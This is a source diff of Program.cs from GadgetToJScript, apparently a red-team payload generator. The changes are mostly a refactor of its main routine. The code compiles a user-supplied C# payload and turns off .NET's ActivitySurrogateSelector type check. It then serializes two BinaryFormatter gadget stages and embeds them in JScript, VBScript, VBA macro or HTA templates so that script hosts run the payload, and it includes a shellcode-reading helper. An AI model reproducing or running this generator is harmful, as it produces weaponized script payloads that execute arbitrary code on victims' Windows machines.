@@ -10,21 +10,20 @@
 //    You should have received a copy of the GNU General Public License
 //    along with GadgetToJscript.  If not, see <http://www.gnu.org/licenses/>.
 
-
-using NDesk.Options;
 using System;
-using System.Collections.Generic;
-using System.Configuration;
 using System.IO;
 using System.Linq;
-using System.Reflection;
-using System.Runtime.Serialization.Formatters.Binary;
 using System.Text;
+using System.Reflection;
+using System.Configuration;
+using System.Collections.Generic;
+using System.Runtime.Serialization.Formatters.Binary;
+
+using NDesk.Options;
 
 namespace GadgetToJScript{
 
-    class Program{
-
+    class Program {
 
         enum EWSH
         {
@@ -49,9 +48,7 @@ namespace GadgetToJScript{
 
         static void Main(string[] args)
         {
-
             var show_help = false;
-
 
             OptionSet options = new OptionSet(){
                 {"i|input=","Input file, example: C:\\Users\\userX\\Desktop\\payload.cs", v => _inputFName=v},
@@ -59,43 +56,47 @@ namespace GadgetToJScript{
                 {"w|scriptType=","js, vbs, vba or hta", v =>_wsh=v},
                 {"e|encodeType=","VBA gadgets encoding: b64 or hex (default set to b64)", v => _enc=v},
                 {"o|output=","Generated payload output file, example: C:\\Users\\userX\\Desktop\\output (Without extension)", v =>_outputFName=v},
-                {"f|regfree","registration-free activation of .NET based COM components", v => _regFree = v != null},
-                {"h|help=","Show Help", v => show_help = v != null},
+                {"f|regfree","Registration-free activation of .NET based COM components", v => _regFree = v != null},
+                {"h|?|help","Show Help", v => show_help = v != null},
             };
 
             try
             {
                 options.Parse(args);
 
+                if (show_help)
+                {
+                    ShowHelp(options);
+                    return;
+                }
+
                 if (_wsh == "" || _outputFName == "" || _inputFName == "")
                 {
-                    showHelp(options);
+                    ShowHelp(options);
                     return;
                 }
 
                 if (!Enum.IsDefined(typeof(EWSH), _wsh))
                 {
-                    showHelp(options);
+                    ShowHelp(options);
                     return;
                 }
 
                 if (!Enum.IsDefined(typeof(ENC), _enc))
                 {
-                    showHelp(options);
+                    ShowHelp(options);
                     return;
                 }
-
             }
             catch (Exception e)
             {
-                Console.WriteLine(e.Message);
-                Console.WriteLine("Try --help for more information.");
-                showHelp(options);
+                Console.Error.WriteLine(e.Message);
+                ShowHelp(options);
                 return;
-
             }
 
             string resourceName = "";
+
             switch (_wsh)
             {
                 case "js":
@@ -106,8 +107,6 @@ namespace GadgetToJScript{
                     resourceName = "GadgetToJScript.templates.vbscript.template";
                     break;
                 case "vba":
-                    //Console.WriteLine("Not supported yet, only JS, VBS and HTA are supported at the moment");
-                    //return;
                     if (_enc == "b64") {
                         resourceName = "GadgetToJScript.templates.vbascriptb64.template";
                     }
@@ -124,43 +123,39 @@ namespace GadgetToJScript{
                     break;
             }
 
-
             MemoryStream _msStg1 = new MemoryStream();
-            _DisableTypeCheckGadgetGenerator _disableTypCheckObj = new _DisableTypeCheckGadgetGenerator();
+            DisableTypeCheckGadgetGenerator _disableTypCheckObj = new DisableTypeCheckGadgetGenerator();
 
-            _msStg1 = _disableTypCheckObj.generateGadget(_msStg1);
-
+            _msStg1 = _disableTypCheckObj.GenerateGadget(_msStg1);
 
             ConfigurationManager.AppSettings.Set("microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck", "true");
 
-
-            Assembly testAssembly = TestAssemblyLoader.compile(_inputFName, _references);
+            Assembly testAssembly = AssemblyLoader.Compile(_inputFName, _references);
 
             BinaryFormatter _formatterStg2 = new BinaryFormatter();
             MemoryStream _msStg2 = new MemoryStream();
-            _ASurrogateGadgetGenerator _gadgetStg = new _ASurrogateGadgetGenerator(testAssembly);
+            ASurrogateGadgetGenerator _gadgetStg = new ASurrogateGadgetGenerator(testAssembly);
 
             _formatterStg2.Serialize(_msStg2, _gadgetStg);
-
 
             Assembly assembly = Assembly.GetExecutingAssembly();
             string _wshTemplate = "";
 
-
             using (Stream stream = assembly.GetManifestResourceStream(resourceName))
-
-            if (_wsh != "vba"){
-
-                using (StreamReader reader = new StreamReader(stream))
+            {
+                if (_wsh != "vba")
                 {
-                    _wshTemplate = reader.ReadToEnd();
-                    _wshTemplate = _wshTemplate.Replace("%_STAGE1_%", Convert.ToBase64String(_msStg1.ToArray()));
-                    _wshTemplate = _wshTemplate.Replace("%_STAGE1Len_%", _msStg1.Length.ToString());
-                    _wshTemplate = _wshTemplate.Replace("%_STAGE2_%", Convert.ToBase64String(_msStg2.ToArray()));
-                    _wshTemplate = _wshTemplate.Replace("%_STAGE2Len_%", _msStg2.Length.ToString());
+                    using (StreamReader reader = new StreamReader(stream))
+                    {
+                        _wshTemplate = reader.ReadToEnd();
+                        _wshTemplate = _wshTemplate.Replace("%_STAGE1_%", Convert.ToBase64String(_msStg1.ToArray()));
+                        _wshTemplate = _wshTemplate.Replace("%_STAGE1Len_%", _msStg1.Length.ToString());
+                        _wshTemplate = _wshTemplate.Replace("%_STAGE2_%", Convert.ToBase64String(_msStg2.ToArray()));
+                        _wshTemplate = _wshTemplate.Replace("%_STAGE2Len_%", _msStg2.Length.ToString());
+                    }
                 }
-            }
-            else{
+                else
+                {
                     List<string> stage1Lines = new List<String>();
                     List<string> stage2Lines = new List<String>();
 
@@ -169,11 +164,11 @@ namespace GadgetToJScript{
                         stage1Lines = SplitToLines(Convert.ToBase64String(_msStg1.ToArray()), 100).ToList();
                         stage2Lines = SplitToLines(Convert.ToBase64String(_msStg2.ToArray()), 100).ToList();
                     }
-                    else{
+                    else
+                    {
                         stage1Lines = SplitToLines(BitConverter.ToString(_msStg1.ToArray()).Replace("-", ""), 100).ToList();
                         stage2Lines = SplitToLines(BitConverter.ToString(_msStg2.ToArray()).Replace("-", ""), 100).ToList();
                     }
-
 
                     StringBuilder _b1 = new StringBuilder();
                     _b1.Append("stage_1 = \"").Append(stage1Lines[0]).Append("\"");
@@ -197,12 +192,12 @@ namespace GadgetToJScript{
                         _b2.AppendLine();
                     }
 
-
                     using (StreamReader reader = new StreamReader(stream))
-                {
-                    _wshTemplate = reader.ReadToEnd();
-                    _wshTemplate = _wshTemplate.Replace("%_STAGE1_%", _b1.ToString());
-                    _wshTemplate = _wshTemplate.Replace("%_STAGE2_%", _b2.ToString());
+                    {
+                        _wshTemplate = reader.ReadToEnd();
+                        _wshTemplate = _wshTemplate.Replace("%_STAGE1_%", _b1.ToString());
+                        _wshTemplate = _wshTemplate.Replace("%_STAGE2_%", _b2.ToString());
+                    }
                 }
             }
 
@@ -210,48 +205,50 @@ namespace GadgetToJScript{
             {
                 _generatedWSH.WriteLine(_wshTemplate);
             }
-
         }
 
-        public static void showHelp(OptionSet p)
+        public static void ShowHelp(OptionSet p)
         {
             Console.WriteLine("Usage:");
             p.WriteOptionDescriptions(Console.Out);
         }
 
-        public static byte[] readRawShellcode(string _SHFname)
+        public static byte[] ReadRawShellcode(string _SHFname)
         {
             byte[] _buf = null;
+
             using (FileStream fs = new FileStream(_SHFname, FileMode.Open, FileAccess.Read))
             {
                 _buf = new byte[fs.Length];
                 fs.Read(_buf, 0, (int)fs.Length);
             }
+
             return _buf;
         }
 
         public static IEnumerable<string> SplitToLines(string stringToSplit, int maximumLineLength)
         {
             var words = stringToSplit.Split(' ').Concat(new[] { "" });
+
             return words.Skip(1).Aggregate(words.Take(1).ToList(),
                 (a, w) =>
                 {
                     var last = a.Last();
+
                     while (last.Length > maximumLineLength)
                     {
                         a[a.Count() - 1] = last.Substring(0, maximumLineLength);
                         last = last.Substring(maximumLineLength);
                         a.Add(last);
                     }
+
                     var test = last + " " + w;
+
                     if (test.Length > maximumLineLength)
-                    {
                         a.Add(w);
-                    }
                     else
-                    {
                         a[a.Count() - 1] = test;
-                    }
+
                     return a;
                 });
         }
